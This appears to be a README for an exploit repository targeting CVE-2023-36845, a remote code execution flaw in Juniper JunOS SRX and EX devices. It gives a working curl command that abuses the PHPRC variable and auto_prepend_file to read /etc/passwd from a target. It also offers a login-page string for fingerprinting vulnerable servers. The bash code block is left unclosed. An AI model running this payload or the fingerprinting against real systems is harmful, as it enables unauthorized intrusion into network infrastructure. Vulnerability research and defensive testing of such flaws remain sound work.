# CVE-2023-36845 Exploit

This repository contains an exploit for CVE-2023-36845, a Remote Code Execution (RCE) vulnerability in Juniper JunOS within SRX and EX Series, with a CVSS score of 9.8.

## Description

Through skillful manipulation of a tailored request to configure the PHPRC variable, an attacker gains the ability to modify the PHP execution environment, facilitating the injection and execution of code.

To verify the vulnerability on your system, you can use the following code snippet:

```bash
$ curl <Target_URL> -F $'auto_prepend_file="/etc/passwd\n"' -F 'PHPRC=/dev/fd/0'

In addition, based on my examinations so far, it is advisable to be particularly cautious with servers containing the character "#js2nr0px1R2" assigned to the variable "document.login.password.value" embedded in the web server script as well. So, in my observations, I have noticed that all instances I have examined with this characteristic are vulnerable for now.
